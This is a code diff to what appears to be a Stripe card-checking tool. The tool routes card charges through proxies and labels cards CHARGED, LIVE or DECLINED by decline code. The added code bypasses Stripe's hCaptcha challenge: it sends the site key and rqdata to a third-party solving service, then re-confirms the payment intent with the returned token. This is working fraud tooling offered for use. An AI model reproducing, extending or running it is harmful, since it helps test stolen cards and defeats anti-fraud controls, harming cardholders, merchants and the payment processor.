@@ -17,6 +17,7 @@ from utils.stripe import (
     generate_eid, get_stripe_cookies, get_random_stripe_js_agent,
 )
 from utils.proxy import get_proxy_url
+from utils.captcha import solve_hcaptcha
 
 
 def extract_checkout_url(text: str) -> str:
@@ -455,8 +456,90 @@ async def charge_card(card: dict, checkout_data: dict, proxy_str: str = None, us
                                 if isinstance(stripe_js, dict):
                                     site_key = stripe_js.get("site_key", "")
                                 print(f"[DEBUG] 🔒 hCaptcha challenge — site_key={site_key[:20] if site_key else 'N/A'}")
-                                result["status"] = "3DS"
-                                result["response"] = f"CAPTCHA [{sdk_type}]"
+                                
+                                # ━━━ Auto-solve hCaptcha via NopeCHA ━━━
+                                pi_id = pi.get("id", "")
+                                pi_secret = pi.get("client_secret", "")
+                                checkout_url = checkout_data.get("url", "https://checkout.stripe.com")
+                                captcha_proxy = proxy_url if proxy_url else None
+                                captcha_ua = headers.get("user-agent", "")
+                                
+                                # Extract rqdata for hCaptcha Enterprise (Stripe always sends this)
+                                rqdata = ""
+                                if isinstance(stripe_js, dict):
+                                    rqdata = stripe_js.get("rqdata", "")
+                                if rqdata:
+                                    print(f"[DEBUG] 🔑 rqdata found: {rqdata[:30]}...")
+                                
+                                captcha_token = await solve_hcaptcha(
+                                    site_key=site_key,
+                                    url=checkout_url,
+                                    rqdata=rqdata or None,
+                                    proxy=captcha_proxy,
+                                    user_agent=captcha_ua,
+                                )
+                                
+                                if captcha_token and pi_id and pi_secret:
+                                    print(f"[DEBUG] ✅ Captcha solved! Re-confirming PI...")
+                                    
+                                    # Use verification_url from Stripe response (for Checkout Sessions)
+                                    verify_path = ""
+                                    if isinstance(stripe_js, dict):
+                                        verify_path = stripe_js.get("verification_url", "")
+                                    
+                                    if verify_path:
+                                        verify_url = f"https://api.stripe.com{verify_path}"
+                                    else:
+                                        verify_url = f"https://api.stripe.com/v1/payment_intents/{pi_id}/verify_challenge"
+                                    
+                                    print(f"[DEBUG] Verify URL: {verify_url}")
+                                    
+                                    # Build verify body with hcaptcha token
+                                    reconfirm_body = (
+                                        f"client_secret={pi_secret}"
+                                        f"&hcaptcha_token={captcha_token}"
+                                        f"&key={pk}"
+                                    )
+                                    
+                                    try:
+                                        r2 = await s.post(
+                                            verify_url,
+                                            headers=headers,
+                                            data=reconfirm_body,
+                                            proxy=proxy_url,
+                                            timeout=25
+                                        )
+                                        reconf = r2.json()
+                                        print(f"[DEBUG] Re-confirm response: {str(reconf)[:200]}...")
+                                        
+                                        reconf_status = reconf.get("status", "")
+                                        if reconf_status == "succeeded":
+                                            result["status"] = "CHARGED"
+                                            result["response"] = "Solved Captcha ✅"
+                                            print(f"[DEBUG] ✅ CHARGED after captcha solve!")
+                                        elif "error" in reconf:
+                                            re_err = reconf["error"]
+                                            re_dc = re_err.get("decline_code", "")
+                                            re_msg = re_err.get("message", "Failed after captcha")
+                                            if re_dc in LIVE_DECLINE_CODES:
+                                                result["status"] = "LIVE"
+                                            else:
+                                                result["status"] = "DECLINED"
+                                            result["response"] = f"Solved Captcha → [{re_dc or re_err.get('code', '')}] [{re_msg}]"
+                                            print(f"[DEBUG] Declined after captcha: {re_dc} - {re_msg}")
+                                        else:
+                                            result["status"] = "SOLVED CAPTCHA"
+                                            result["response"] = f"Captcha Solved → {reconf_status}"
+                                            print(f"[DEBUG] Captcha solved, PI status: {reconf_status}")
+                                    except Exception as e2:
+                                        print(f"[DEBUG] ❌ Re-confirm error: {str(e2)[:60]}")
+                                        result["status"] = "SOLVED CAPTCHA"
+                                        result["response"] = f"Captcha Solved — confirm failed"
+                                else:
+                                    if not captcha_token:
+                                        print(f"[DEBUG] ❌ Captcha solve failed")
+                                    result["status"] = "3DS"
+                                    result["response"] = f"CAPTCHA [{sdk_type}] — solve failed"
                             else:
                                 result["status"] = "3DS"
                                 result["response"] = f"3DS Challenge [{sdk_type}]"
